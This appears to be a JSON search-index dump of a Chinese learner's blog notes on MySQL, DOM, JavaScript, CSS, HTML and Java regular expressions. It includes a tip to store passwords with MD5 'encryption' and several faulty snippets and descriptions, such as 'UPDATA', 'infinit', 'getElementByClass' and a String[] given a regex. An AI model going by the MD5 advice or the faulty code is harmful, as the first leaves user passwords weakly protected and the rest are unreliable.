TIMESTAMP：虽然会以年、月、日、时、分、秒表示，但是==本质上还是时间戳，不能存储 1970 年之前的日期==，==使用 now() 函数进行赋值==。 bit：一位数据，0、1； 插入数据完整插入 INSERT INTO：表示插入； table_name：需要操作的表格； VALUES：表示插入多个数据； ( )：括号内写一行数据。 ==必须按照表格的列字段顺序进行插入，如果某列不需要填值，使用 null 代替==。 1INSERT INTO table_name VALUES (1001, &#39;张三&#39;, &#39;男&#39;, 21, &#39;计算机科学&#39;, &#39;1801&#39;); ### 部分插入 INSERT INTO [table_name] (feild_1, feild_2) VALUES(value_1, value_2); 只插入表的指定列数据，适用于表数据列较多的情况。 1INSERT INTO student_t(id, name) VALUES(1001, &quot;张三&quot;); ==表中插入表== INSERT [table_name] SELECT * FROM [table_name]; 将该表所有内容，插入到该表中，相当于数据翻倍。==表结构要求一致==。 2查询表 DESC [table_name]; 查看表的描述信息。 SHOW CREATE TABLE [table_name]; 查看表的创建信息。 查询表内数据 SELECT * FROM [table_name]; *：星号表示所有！ 数据修改 一次修改所有行 UPDATA [table_name] SET [feild_name] = &#39;value&#39;; 指定条件修改 UPDATA [table_name] SET [feild_1] = &#39;value&#39; WHERE id = 1001; 指定多个条件（ and 连接），修改多处（逗号连接） UPDATE [table_name] SET [f_1]=&#39;v1&#39;, [f_2] = &#39;v2&#39; WHERE id=1001 AND f_3=&#39;v3&#39;; 关系运算符 并且 —— AND； 或者 —— OR； 多个条件可以使用括号( )并列。 注意 SQL 中==赋值，和对比都是使用单个 = 等号！== 判断为空 IS NULL：用 IS 关键字进行判断是否为空，不能使用 = 等号。 IS NOT NULL：判断不为空。 删除数据删除所有数据 DELETE FROM table_name; TRUNCATE table_name; 区别 DELETE 后面可以跟条件进行筛选；而 TRUNCATE 不能添加条件。 DELETE 操作在日志中会有记录，可以使用回滚恢复；TRUNCATE 没有日志记录。 DELETE 是删除数据而已，TRUNCATE 是删除完整张表，再重建了一个空表。 和 DROP 区别 DROP 是删除整张表，操作后表不存在； TRUNCATE 和 DELETE 删完表还在，只针对于数据。 删除某行数据 DELETE FROM table_name WHERE id=1001 OR name=&#39;张三&#39;; 数据约束 约束：用来规定以及限制数据内容。 主键约束（PRIMARY KEY）：非空，且唯一。一般情况下第一列即使主键。 唯一约束（UNIQUE）：列的值，在本列中不能出现重复； 非空约束（NOT NULL）：约束的列属性，不能为空； 外键约束：跟父子表有关（约束了子表的增加以及父表的删除）。 检查约束（mysql存在，都是无效）：比如性别只能男、女；年龄必须合法范围内，等等…… 定义表的时候，可用 CONSTRAINT 关键字单独一条语句来创建约束。 CONSTRAINT id_pk PRIMARY KEY(id), CONSTRAINT id_fk_class FOREIGN KEY(class_id) REFERENCES class(id), 默认值：使用 DEFAULT 关键字来给列属性设定默认值，如果插入的时候没有设置，就以默认值代替。 自增长：一般情况下 mysql 中如果主键是 int 类型的话，可以使用自增长来让 mysql 自动维护主键的值。 注释：COMMENT关键字 创建表的时候，每一行后面添加注释，不会影响数据，只是在填写表数据的时候做一个提醒的作用。 应用代码 123456789101112131415161718CREATE TABLE student_t( id int PRIMARY KEY AUTO_INCREMENT, name VARCHAR(20) UNIQUE, sex VARCHAR(1) NOT NULL DEFAULT &#39;男&#39;, age int COMMENT &#39;年龄0~200之间&#39;, CHECK(age BETWEEN 0 AND 200));INSERT INTO student_t VALUES(10001, &#39;张三&#39;, &#39;男&#39;, 18);# 唯一性约束插入重复值，失败，但是自增计数器调用 INSERT 的时候以及自增了INSERT INTO student_t VALUES(NULL, &#39;张三&#39;, &#39;男&#39;, 210);INSERT INTO student_t VALUES(NULL, &#39;李四&#39;, &#39;女&#39;, -18);# 使用 NULL 来填充自增字段，使用 DEFAULT 填充规定了默认值的字段。INSERT INTO student_t VALUES(NULL, &#39;王五&#39;, DEFAULT, 201);# 唯一约束对 NULL 无效，可以有多个 NULLINSERT INTO student_t VALUES(NULL, NULL, DEFAULT, 66); 外键约束使用 相当于 Java 中，关联两个类，需要彼此设置对方类型的属性； SQL 中，主键表示一个表中的每条记录的唯一标识，主键值表示该记录； 因此，设置列字段，类型同另外一张父表的主键，然后将其设为外键。这样就将两张表关联起来了。 如果，该外键字段值，在父表中不存在，那就不能添加这一行数据； 如果，如果父表要删除，但是还有子表数据关联该父表数据，就不能进行删除操作。 1234567891011121314151617181920CREATE TABLE class( id int PRIMARY KEY, name VARCHAR(20));CREATE TABLE student( id int PRIMARY KEY, name VARCHAR(20), class_id int, CONSTRAINT student_fk_class FOREIGN KEY(class_id) REFERENCES class(id) # 进行绑定); # 外键名，并不是外键属性名，需要重新弄一个列属性作为外键。INSERT INTO class VALUES(101, &#39;一楼一班&#39;);INSERT INTO class VALUES(102, &#39;一楼二班&#39;);INSERT INTO student VALUES(10001, &#39;张三&#39;, 101);INSERT INTO sutdent VALUES(10002, &#39;李四&#39;, 201);# 班级不存在，插入失败DELETE FROM class WHERE id&#x3D;101; # 班级有人，删除失败DELETE FROM class WHERE id&#x3D;102; # 班级无人，删除成功 4修改表​ 当表已经存在的时候，后期可能需要，对表中的列进行增、删。或者，对每一列的约束进行修改，就需要使用到 DDL中的 ALTER（修改）关键字。 列修改 增加一列 ALTER TABLE table_name ADD new_field_name VARCHAR(20); 修改列类型（MODIFY 相当于重建，删除后再新建） ALTER TABLE table_name MODIFY field_name VARCHAR(10); 修改列名称 ALTER TABLE table_name CHANGE field_name new_field_name VARCHAR(10); 删除列 ALTER TABLE table_name DROP field_name; 表修改 修改表名 ALTER TABLE table_name RENAME TO new_table_name; 约束修改 主键 添加：ALTER TABLE table_name ADD PRIMARY KEY(field_name); 删除：ALTER TABLE table_name DROP PRIMARY KEY; 主键只有一个，直接删除即可。 外键 添加：ALTER TABLE table_name ADD CONSTRAINT student_fk_class FOREIGN KEY(class_id) REFERENCES class(id); 删除：ALTER TABEL table_name DROP FORIGEN KEY student_fk_class; 唯一约束 添加：ALTER TABLE table_name ADD CONSTRAINT UNIQUE(unique_field); 删除：ALTER TABLE table_name DROP INDEX unique_field; (这里 index 是网上找的貌似是索引，还没学；老师用 KEY 看不懂) 非空约束 添加：ALTER TABLE table_name MODIFY field_name VARCHAR(10) NOT NULL; 删除：ALTER TABLE table_nae MODIFY filed_name VARCHAR(10); 自增 添加：ALTER TABLE table_name MODIFY field_name INT AUTO_INCREMENT; 删除：ALTER TABLE table_nane MODIFY filed_name INT; 修改：ALTER TABLE table_name AUTO-INCREMENT = 1000; DEFAULT 同上，使用 MODIFY 即可； CHECH约束：mysql只能写，但是无效，oracle再提。 约束的分类争议 观点1 列级约束：自增，默认值，非空，check。 表级约束：主键，外键，唯一。 观点2 行级约束：自增，默认值，非空，check。 列级约束：主键，外键，唯一。 观点3 行级约束：自增，默认值，非空，check。 表级约束：主键，外键，唯一。 实际开发注意事项存储密码使用MD5进行加密 信息录入用户自定义的信息只是数据库信息的少部分，还有很多部分信息是默认的，或者是由SQL语句来自动生成的。 比如操作时间，SQL自动调用 now() 函数进行录入！用户是否管理员，采用默认！等等…… 假删除用户注销账号后，后台并不是直接删除该数据，而只是修改用户状态为“弃用”等方式，实现假删除。 假查询用户查询，或者某些权限不够的人使用查询功能时，往往不是输出所有的数据库用户信息，需要根据权限采用限制条件查询。 比如，对于查询当前所有用户，就需要避开数据库中，状态为“弃用”的用户信息 WHERE user_state=1 ；","link":"","tags":[{"name":"mysql","slug":"mysql","permalink":"http://www.fangning.xyz.com/tags/mysql/"}]},{"title":"DOM","date":"2021-12-03T02:06:30.000Z","path":"2021/12/03/2021.12.03 DOM/","text":"DOM修改标签属性 1、获取标签 通过 id 获取：document.getElementById(&quot;idName&quot;); 通过类获取（返回标签数组）：document.getElementByClass(&quot;p&quot;); … 2、通过标签修改属性 只改文本：.innerText=&quot;新文本&quot; ; 修改HTML：.innerHTML=&quot;&lt;h1&gt;新的标签&lt;/h1&gt;&quot; ; 修改属性：.fieldName=&quot;fieldNewValue&quot; ; 实现图片旋转 借用外部的 fond库中的，旋转Class——“fa-span”； 将所需要旋转的标签，嵌入到 i 标签中，然后使 i 标签旋转； CSS 控制动画的属性： animation：[动画效果] 1.0s linear 1.0s infinit; 其中动画效果，==填写实现类==，比如 “fa-span”；==后面的时间，表示刷新频率，每隔 1s 转动一次==； linear 参数表示起始倒计时，1s 后开始； infinit 参数表示无尽模式，一直展示； 12345&lt;style&gt; i&#123; animation: fa-spin 1.0s linear infinit; &#125;&lt;/style&gt;","link":"","tags":[{"name":"js","slug":"js","permalink":"http://www.fangning.xyz.com/tags/js/"}]},{"title":"javaScript","date":"2021-12-02T06:27:30.000Z","path":"2021/12/02/2021.12.02 javaScript/","text":"js​ Java Script 与 java 没有如何关系，它是一门弱类型语言（脚本语言）；JS 主要是用于嵌入到 HTML 中，由浏览器去执行，目前几乎所有的主流浏览器都支持 JS。 ​ JS 主要能实现的功能是让页面动起来，而该动作是需要满足触发条件的，需要设置前提条件，称之为 JS 事件： 点击事件 onclick 鼠标悬浮事件 onmouseover 鼠标失去焦点事件 onmouserout 按键事件 JS 可以在发生事件的时候，动态的添加或删除标签以及修改标签的 CSS 属性等操作。 组成JS 核心分为三部分组成： 1， ECMAScript（核心基础）：主要包括基本的语法，变量，循环，选择分支语句，运算符等内容； 2，BOM（浏览器对象模型）：将浏览器当成一个对象来使用，里面有一个操控浏览器窗口的方法等。 3，DOM（文档对象模型）：将 HTML 中所有标签都当成对象来看待。 将 html 中所有标签都看成一个对象（节点），通过任意一个节点都能找到其祖辈以及平辈或后辈，然后对其进行操控，这就是所谓的 DOM 树。 语法详情请参考菜鸟教程 数据类型​ JS 是弱类型的语言，所以对于数据类型的认知非常模胡，在==创建的时候认为所有数据都是 var 类型。== this ：表示当前 windows 窗口。 比较：可以直接使用 “==”。 12345678910111213&lt;script&gt; function method()&#123; window.alert(&quot;hello java&quot;) ; var a = 4; alert(a); var b = 3.14; alert(b); var c = &quot;字符串&quot;; alert(c); var d = new Array(&quot;李四&quot;, &quot;王五&quot;); alert(d); &#125;&lt;/script&gt; 字符串和数字相加，结果是字符串连接； 字符串和数字可以运算（前提是字符串都是数字组成） “12” + 12 = 1212； “12” - 12 = 0； 定义一个方法 可以写在 head 中，或者 body 都可以。 但是无论写在哪儿，都需要==写在 script 标签内==。==同 CSS 需要写在 style 标签内==。 注释： js 中的注释，再次回到了 java 风格。 12345&lt;script&gt; function method() &#123; window.alert(&quot;Hello JavaScript!&quot;); // window是一个全局对象 &#125;&lt;/script&gt; 调用方法 一般使用按钮，并且按钮按下时，调用 JS 方法。 在标签的属性中，进行调用！ 123&lt;button onclick=&quot;method()&quot;&gt; 点我调用 method() JS 方法&lt;/button&gt; 弹窗输出 window.alert(&quot;弹窗内容！&quot;); 使用全局对象 window 调用 alert 方法，==调用了浏览器的弹窗显示==。 window 是浏览器最顶层的对象，所以可以省略不写。 弹出的时候，程序中断停止，等待弹窗被确认，再继续执行。 ## 控制台输出 window.console.log(&quot;输出内容&quot;); 在浏览器界面 F12 后，显示的 Console 控制台输出内容； 作用域JS 中变量的作用域： 1、直接声明在 script 标签内的变量是全局变量，可以在所有的 js 函数中使用； 2、函数内声明的叫局部变量，作用域是当前作用域； 3、无论在什么位置，如果声明的变量没有指定 var 的话，这个变量回呗注册儿成 windows 属性（可以当全局变量使用，但是尽量不要这样）。范围比全局更宽。 字符串 可以在单引号内，也可以在双引号内。 等号JS 中有 === 三个等号的运算： ==两个等号==，有隐式的强制转化，两边的变量可以不是同一个类型，比较值是否一致（因此对象，没有 equals 函数）； ==三个等号==，需要判断两个变量类型是否一致。 对象 JS 中没有类的概念； 但是有对象的概念； 所有的对象都是 var 类型； 实例化语法如下 使用 JSON 格式创建 JS 对象。 [] ：使用中括号表示数组，中括号内部可以有很多大括号； 一个大括号，表示一个对象的描述。 123456789101112131415var dog = &#123; name:&quot;小花&quot;, // 对象属性 age:66, color:&quot;蓝色&quot;, method1:function() &#123; // 对象方法 alert(123) ; alert(456) ; alert(789) ; &#125;, method2:function() &#123; alert(&quot;第二个方法！&quot;) ; &#125;&#125; ;windows.alert(dog.color) ;","link":"","tags":[{"name":"js","slug":"js","permalink":"http://www.fangning.xyz.com/tags/js/"}]},{"title":"盒子div","date":"2021-12-01T02:13:30.000Z","path":"2021/12/01/2021.12.01 盒子div/","text":"盒子div​ 在 HTML 中几乎所有的标签都能使用盒子模型来进行显示，盒子模型由以下部分组成： 元素内容：标签里面存放的值； 内边距：是指边框距离元素的距离，不能为负；padding 边框：就是边框线；border 外边距：是指自己和其它元素的边距，如果设置成负数，元素就会碰到一起；margin 一个标签实际上在浏览器中占用的空间是：元素自身的宽高+内边距+边框+外边距所组成。","link":"","tags":[{"name":"html","slug":"html","permalink":"http://www.fangning.xyz.com/tags/html/"}]},{"title":"CSS渲染","date":"2021-11-30T16:00:00.000Z","path":"2021/12/01/2021.12.01 CSS渲染/","text":"CSS简介​ 所谓的 CSS 其实就是 html 中的一个 style 标签。该标签写在 head 部分，对body 部分的其它标签属性进行集中设置。 可以使用选择器选中需要渲染的标签； 然后在 &#123;&#125; 主体中进行设置，调整。 嵌套的渲染，具有就近原则，内层渲染优先于外层的设置。 分类 行内样式：写在标签内的样式（修改标签的 style 属性），只针对当前的标签。 内部样式：写在head之内的样式（style标签内部），可以针对本页面所有的标签来设置统一的样式。 外部样式：引入别人写好的css。 三种选择器内部CSS，需要在 style 标签内使用选择器，针对选择器标记的目标进行渲染。 标签选择器 使用 标签名&#123;&#125; ，就可以对所有的该标签进行属性设置。 class选择器 使用.类1、类2&#123;&#125; ，可以对所有 class 属性匹配的标签进行设置。可以==同时设置多个，class 属性一致的标签。== id选择器 使用 #id1&#123;&#125; ，可以指定 id 属性的单个标签进行属性设置。 ==其它选择器==：组合选择器、伪类选择器、后代选择器、子元素选择器、通配符选择器。 对a标签渲染 正常情况 12345&lt;style type=&quot;text/css&quot;&gt; a:link&#123; &#125;&lt;/style&gt; 鼠标悬浮 12345&lt;style type=&quot;text/css&quot;&gt; a:hover&#123; &#125;&lt;/style&gt; 鼠标点击 12345&lt;style type=&quot;text/css&quot;&gt; a:active&#123; &#125;&lt;/style&gt; 访问过后 12345&lt;style type=&quot;text/css&quot;&gt; a:visited&#123; &#125;&lt;/style&gt; 引入外部的CSS","link":"","tags":[{"name":"css","slug":"css","permalink":"http://www.fangning.xyz.com/tags/css/"}]},{"title":"常用标签","date":"2021-11-30T12:02:30.000Z","path":"2021/11/30/2021.11.30 常用标签/","text":"文本标题分割线注释 头部：head 字符集设置：&lt;meta charset=&quot;utf-8&quot;&gt; 主题标签：title，浏览器标签栏显示的内容。 主体：body，所有标签基本上都写在主体中。 文本 span（范围）：==行级标签==，一般作用于一行，可并列行级标签，本身无任何渲染。 p（段落，布局文章）：==块级标签==，一般作用于文本中的一段，独占一行，可设置宽高，本身无任何渲染。 div（隔离）：==块级标签==，一般普通结构框架布局使用div布局。 i 标签（着重文本）、b标签（加粗文本）。 标题 h1、h2、h3、h4、h5、h6 一级标题最大，其余依次变小，块级标签，独占一行。 分割线：hr 注释：&lt;!--这是注释--&gt; 上标签文本：sup 下标签文本：sub 渲染属性 字体大小：font-size:50px ； 字体颜色：color: red ； 字体：font-family: 楷体 ； 字体间距：letter-spacing: 50px； 字体行间距：line-height: 100px； 字体修饰：text-decoration: line-through 上、中、下划线； 文本首行缩进：text-indent: 100px； 字体粗细：font-weight:lighter/bolder细、粗； 文本居中：text-align: center； 也可左对齐，或者右对齐。 符号 空格：&amp;nbsp; 大于号：&amp;gt 小于号：&amp;lt 双引号：&amp;quot 版本号：&amp;copy 列表 有序列表：ol 块级 无序列表：ul 列表项目：li 写在列表的双标签内部，列出所有项目。 条目一 条目二 条目三 定义列表：dl 该标签包含下面两个标签使用。 dt：所需要描述的概念。 dd：描述内容。 这是一个dt ​ 这是一个 dd 标签，用来描述dd内容 渲染属性一般直接对列表的项目li 标签进行设置。 列表点风格：list-style disc：黑点； circle：空心圆点； square：实心方块； decimal：数字； none：无风格 文本大小：font-size: 100px 文本颜色：color: 0xFFFFFF 文本位置：text-ailgn:left/center 图片列表：list-style-image: url 用图片作为列表风格 表格 table ：该双标签表示一个表，内部由 行 和 单元数据组成。 capton：该标签表示该表标题； tr：一行 td：一列 thead：表的第一行，内部嵌套 tr 和 td 使用； tbody：表的中间部分，内部嵌套 tr 和 td 使用； tfoot：表的最后一行，内部嵌套 tr 和 td 使用； 123456789101112&lt;table&gt; &lt;tr&gt; /*第一行*/ &lt;td&gt;第一行第一个&lt;/td&gt; &lt;td&gt;第一行第二个&lt;/td&gt; &lt;td&gt;第一行第三个&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; /*第二行*/ &lt;td&gt;第二行第一个&lt;/td&gt; &lt;td&gt;第二行第二个&lt;/td&gt; &lt;td&gt;第二行第三个&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 渲染属性table 单元格间距：cellspacing:&quot;0&quot; ； 边框：border:solid red 1px 线条，红色，粗细； 背景：background-color:bisque。肉色背景 宽度高度：width=&quot;100%&quot;; height: 30px; tr 行高：height: 10px; 行宽：width: 10px； td 跨列合并：colspan: &quot;2&quot; 横向占两格； 跨行合并：rowspan: &quot;2&quot; 纵向占两格； 表单 ==表单==：form标签。 action 属性：表示该表单作用 method 属性：表示于服务器提交数据的方式 post 值 ：在提交的时候url上不会显示任何的数据信息，提高了数据的安全性，速度较慢，==可以上传大型文件==。 get 值：默认的提交方式，会将数据显示在url之上，牺牲了安全性提高了速度，==不能提交大型数据==，并且提交路径 与表单的数据之间使用 ? 分割，提交数据的时候是使用 key=value 的形式提交的，多个数据之间使用 &amp; 分割。 ==数据输入==：input标签 type 属性（改变输入样式）：text 文本输入、password 密码输入、radio 单选、checkbox 复选、file 文件长传、data 日期输入、submit 提交按钮、reset 重置form表。 name 属性：是变量名，多个不同input可以共用一个name属性，对同一个属性进输入。例如：多个 radio 、 checkbox 应该使用同一个变量名； value 属性：是变量的值，用户输入后被初始化，也可以代码设置。 ==下拉菜单==：select标签 内部嵌套 option 标签 提供下拉选项。 ==备注==：textarea标签 文本域，可以输入较多文字。 所占行高：rows 属性。 所占列长：cols 属性。 ==按钮==：button标签 submit 属性：按下提交 reset 属性：按下重置 form 表 123456789101112131415161718192021222324252627282930&lt;form action=&quot;login&quot; method=&quot;get/post&quot;&gt; 账号：&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;br&gt; 性别：&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;男&quot;/&gt;男 &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;女&quot;/&gt;女&lt;br&gt; 密码：&lt;input type=&quot;password&quot; name=&quot;ps&quot;/&gt;&lt;br&gt; 头像：&lt;input type=&quot;file&quot; name=&quot;file&quot;/&gt;&lt;br&gt; 生日：&lt;input type=&quot;date&quot; name=&quot;date&quot;/&gt;&lt;br&gt; 爱好：&lt;input type=&quot;checkbox&quot; name=&quot;love&quot; value=&quot;读书&quot;/&gt;读书 &lt;input type=&quot;checkbox&quot; name=&quot;love&quot; value=&quot;听歌&quot;/&gt;听歌 &lt;input type=&quot;checkbox&quot; name=&quot;love&quot; value=&quot;看电影&quot;/&gt;看电影 &lt;input type=&quot;checkbox&quot; name=&quot;love&quot; value=&quot;旅游&quot;/&gt;旅游&lt;br&gt; 城市： &lt;select&gt; &lt;option value=&quot;郑州&quot;&gt;郑州&lt;/option&gt; &lt;option value=&quot;上海&quot;&gt;上海&lt;/option&gt; &lt;option value=&quot;北京&quot;&gt;北京&lt;/option&gt; &lt;option value=&quot;衡州&quot;&gt;衡州&lt;/option&gt; &lt;option value=&quot;芜湖&quot;&gt;芜湖&lt;/option&gt; &lt;/select&gt; 备注：&lt;textarea&gt; &lt;/textarea&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot; /&gt; &lt;intpu type=&quot;reset&quot; value=&quot;重置&quot; /&gt; &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt; &lt;button type=&quot;reset&quot;&gt;重置&lt;/button&gt;&lt;/form&gt; 图片 插入图片：img 路径属性：src 图片的路径，可以是本地的绝对路径，相对路径（常用），或者是网络路径； 报错提示属性：alt 如果图片加载不出，显示提示； 图片信息：title 鼠标放置，显示该信息。 1&lt;img src=&quot;../img/1.webp&quot; alt=&quot;图片加载失败&quot; title=&quot;这是三只狗&quot;&gt; 尺寸 宽度：width 高度：height a 标签 ==标签==，双标签 ==href 属性== 作为链接：”url链接 / 路径” 跳转到指定路径 html 或者 图片； 作为功能：”mailto:xxx.com” 邮箱路径，打开本地邮箱进行发送； 作为页面内跳转：#end 跳转到 name 属性为 end 的 a 标签位置； name 属性 作为跳转终点：”name”； ==target 属性== _blank：打开一个新窗口，并且每次都是新的窗口； parent：直接在自身页面进行跳转； _search：跳转到打开的新窗口，如果已经之前打开过窗口这次就直接跳转，不在打开新的； self：直接在自身页面进行跳转； _top：顶级网页进行跳转，如果自身就是顶级网页则自身跳转。 1234567&lt;a name=&quot;顶部&quot;&gt;&lt;/a&gt;&lt;a href=&quot;../2 唐诗三百首.html&quot; target=&quot;_top&quot;&gt;点击打开静夜思&lt;/a&gt;&lt;a href=&quot;mailto:2508442960@qq.com&quot;&gt;点击站长信箱&lt;/a&gt;&lt;a href=&quot;#顶部&quot;&gt;点击返回顶部&lt;/a&gt; 嵌套图片链接 点击图片进行跳转 1&lt;a href=&quot;#&quot;&gt; &lt;img src=&quot;1.webp&quot;&gt; &lt;/a&gt; 渲染属性 字体大小：font-size: xxpx； 字体颜色：color: #FFFFFF ；修改链接颜色； 文本修饰：text-decoration: none；可以消除链接的下划线； 字体：font-family: 楷体；可以修改字体，宋体，楷体等… 背景对 body 进行渲染，可以作用到整个页面。 渲染属性 背景图：``； 背景图坐标：``； 背景颜色：``； 背景铺设大小：``； 背景移动：``； 是否重复平铺：``。【","link":"","tags":[{"name":"html","slug":"html","permalink":"http://www.fangning.xyz.com/tags/html/"}]},{"title":"html","date":"2021-11-30T11:22:30.000Z","path":"2021/11/30/2021.11.30 开始html/","text":"HTML HTML： ==超文本标记语言==，里面定义了非常多的标签,语言的主要目的是用来描述网页； HTML：HTML只是一个标记语言，并不是类似于Java一类的编程语言,所以==在HTML中没有任何的逻辑性==； 所有的标签都有自己的功能，而我们需要做的就是==使用这些标签来描述一个网页==。 软件工具 使用 HBuilder：一个比较流程，好用的编译器。 速度比较快，然后界面也挺简洁方便的，打开速度啥的都很顺滑。 有几种主流的主题，可以适用其他编译器的快捷键风格。 标签 HTML中标签主要分为三部分： &lt;html&gt; &lt;/html&gt;：相当于树的==根==，其余所有标签都需要在这个标签之内； &lt;head&gt;&lt;/head&gt; ==头部==：我们网站的编码格式，网站的名称，被搜索引擎搜索的关键字，引入的外部内容等一切东西。 &lt;body&gt;&lt;/body&gt; ==身体==：一般情况，我们所有想显示在浏览器中的内容都需要写在body中。 写法划分 ==双标签== 一般标签都是成双成对的。开始标签，如&lt;head&gt; 起始 ；结束标签，如&lt;/head&gt; 作结。 ==单标签== 只有一个标签。如：&lt;br&gt; 换行、&lt;hr&gt; 水平分割线。 功能划分 ==行级标签== 可以多个标签存在一行，对宽高属性值不生效，完全靠内容撑开宽高！ ==a、span==、 em、 strong、 ==b==、 i、 u、 label、 ==br== …… ==块级标签== 独占一行，对宽高的属性值生效； 如果不给宽度，块级元素就默认为浏览器的宽度，即就是100%宽； ==p、div、ul、ol、li==、dl、dt、dd、==h1~h6、form==； ==行内块标签== 结合的行内和块级的优点：对宽高属性生效，且可多标签并存一行。 img、input、textarea。 各个标签之间可以相互转化 块级标签 转换为 行内标签：display:inline; 行内标签 转换为 块级标签：display:block; 转换为 行内块标签：display：inline-block;","link":"","tags":[{"name":"html","slug":"html","permalink":"http://www.fangning.xyz.com/tags/html/"}]},{"title":"正则表达式","date":"2021-11-29T13:41:30.000Z","path":"2021/11/29/2021.11.29 正则表达式/","text":"认识正则表达式​ 我们都知道 String 是一个非常万能的类型，不仅可以支持对字符串的各种处理，还支持向各个数据类型的转化。所以在项目中只要是用户输入的信息基本上都用 String 表示。 ​ 于是在向其它数据类型转换的时候，为了包证转换的正确性，往往需要对其进行一些复杂的验证而处理。这种情况下，如果单纯使用 String 所提供的方法，是非常复杂的。 问题比如，判断字符串是否由数字组成，如果是，转为数值型进行运算。 12345678910111213public static void main(String[] args) &#123; String str = &quot;123&quot; ; if( isDigital(str) ) System.out.println(Integer.parseInt(str)) ;&#125;public static boolean isDigital(String str) &#123; char[] array = str.toCharArray() ; for(int i = 0; i &lt; array.length; i++) &#123; if(array[i] &gt; &#x27;9&#x27; || array[i] &lt; &#x27;0&#x27;) return false ; &#125; return true ;&#125; 简化​ 这样的一个验证过程是非常的简单的，但是如此简单的一个功能，却需要开发这编写大量的程序逻辑代码。​ 如果遇到更加复杂的验证？这种情况下，最好做法就是利用==正则表达式（regex）==来完成。 12345public static void main(String[] args) &#123; String str = &quot;213&quot; ; if( str.matches(&quot;\\\\d+&quot;) ) System.out.println( Integer.parseInt(str) ) ;&#125; 介绍​ 正则表达式最早从 Perl 语言发展而来的。JDK1.4 以前，如果需要使用正则表达式的相关定义，需要引入其他的 *.jar 文件；JDK1.4以后，正则默认被JDK所支持，不需要单独配置了。 ​ ==提供了 java.util.regex 开发包==，并且对String进行了一些修改，可以有方法直接支持正则处理。 特点： 最大的好处在于方便进行==验证处理== 以及方便用于复杂的字符串==修改处理== 比如 eclipse 的代码生成器，找到属性，生成setter，getter。就是用到了正则。 我们实际开发过程中用得最多的是对数据的验证处理上。 常用正则标记​ 如果要进行正则处理，需要首先对常用的正则标记有所掌握，从 JDK1.4 开始，java 提供了一个 java.util.regex 开发包，其中有关 Pattern(模式) 类，中就定义了所有支持的正则标记。 ​ 这个包就两个类，Matcher 和 Pattern 很会少直接用到，但是也会有，呆会儿介绍。 ​ 对于高手来说，这些标记需要记得比较熟练，但是对于我们基本使用，熟知一些常用的就行了。 【数量：单个】==字符匹配== 任意字符：匹配一个字符； ‘ \\ \\ ‘：匹配一个’ \\ ‘ ； 转义字符 ‘ \\n ‘：匹配换行； ‘ \\t ‘：匹配制表符； 12345public static void main(String[] args) &#123; String str = &quot;b&quot; ; String regex = &quot;a&quot; ; // 正则表达式，只匹配一个 System.out.println(str.matches(regex)) ;&#125; 【数量：单个】==字符集匹配== [abc]：表示可能是 a、b、c 中的任意一个字符； 12345public static void main(String[] args) &#123; String str = &quot;x&quot; ; String regex = &quot;[^abc]&quot; ; System.out.println( str.matches(regex) ) ;&#125; [^abc]：表示一个字符，不是 a、b、c 任意一个； [a-zA-Z]：表示一个字母，可大写，或小写； 【数量：单个】==简化的字符集== . ：表示任意一个字符； \\d ：表示一个任意数字，等价于 [0-9] ； \\D ：表示一个非数字，等价于[ ^ 0-9 ] ; \\s ：匹配任意一个空字符（空格、换行、制表符）； 12345public static void main(String[] args) &#123; String str = &quot;a\\n&quot; ; String regex = &quot;\\\\D\\\\s&quot; ; System.out.println( str.matches(regex) ) ;&#125; \\S ：匹配一个非空字符（不是空格，换行，制表符）； \\w：匹配一个字母、数字、或者下划线，等价于[a-zA-Z_0-9]； \\W：匹配非字母数字下划线。 【边界匹配】一般java中用不上。 ^：匹配边界开始； $：匹配边界结束； 【数量表示】 指定匹配次数==默认情况下，只有添加了数量单位，才能匹配多位字符==。 表达式?：该正则符号，可以出现 0次，1次。 表达式*：该正则符号，可以出现 0次，1次，多次。 表达式+：该正则符号，可以出现 1次，多次。 12345public static void main(String[] args) &#123; String str = &quot;abbdds&quot; ; String regex = &quot;\\\\w*&quot; ; // 这些就是数量 System.out.println( str.matches(regex) ) ;&#125; 表达式{n}：表达式的匹配长度，正好为 n 次。 表达式{n,}：表达式的匹配长度，为 n 次以上。 表达式{n,m}：表达式的匹配长度，为 n~m 次。 12345public static void main(String[] args) &#123; String str = &quot;abs&quot; ; String regex = &quot;\\\\w&#123;3,&#125;&quot; ; // 这些就是数量 System.out.println( str.matches(regex) ) ;&#125; 【逻辑表达式】 ：可以连接多个正则。 表达式 X 表达式 Y：X字符后，紧跟者一个表达Y匹配的字符； X | Y：有一个表达式匹配成功即可； ==(表达式)==：为表达式设置一个整体描述，可以为该整体设置数量单位。 String类对正则支持​ 大部分情况下，正则表达式的匹配，都会基于 String 类完成，并且在 String 类中提供了有如下和正则有关的操作方法。 No 方法名称 类型 描述 01 public boolean matches(String ==regex==) 普通 将指定字符串进行正则判断 02 public String replaceAll(String regex, String replacement) 普通 替换全部 03 public String replaceFirst(String regex, String replacement) 普通 替换首个 04 split(String regex) 普通 正则拆分 05 split(String regex, int limit) 普通 正则拆分，只拆limit次 实现字符串替换12345public static void main(String[] args) &#123; String str = &quot;abGRE#$%$#$RH443643s&quot; ; // 删除非字母数字 String regex = &quot;[^a-zA-Z0-9]*&quot; ; System.out.println( str.replaceAll(regex, &quot;&quot;) ) ;&#125; 实现字符串拆分12345678public static void main(String[] args) &#123; String str = &quot;A23253b35c64463643e35&quot; ; // 只要字符，按照数字拆分 String regex = &quot;\\\\d+&quot;; // 一个以上数字 String[] result = str.split(regex) ; for(int i = 0; i &lt; result.length; i++) &#123; System.out.print( result[i] + &quot;,&quot; ); &#125;&#125; 格式验证 判断是否为小数，如果是，转为 double 类型。 12String[] regex = &quot;(-?\\\\d+)(\\\\.\\\\d+)?&quot; ;str.matches(regex) ; 判断一个字符串是否由日期组成，是的话转为 Data 12345String input = &quot;1988-12-11&quot; ;String regex = &quot;\\\\d&#123;4&#125;-\\\\d&#123;2&#125;-\\\\d&#123;2&#125;&quot; ;if(input.matches(regex)) &#123; System.out.println(new SimpleDateFormat(&quot;yyyy-MM-dd&quot;).parse(input)) ;&#125; 判断的给的电话号码是否正确 号码：4790507、\\\\d&#123;7,8&#125; ； 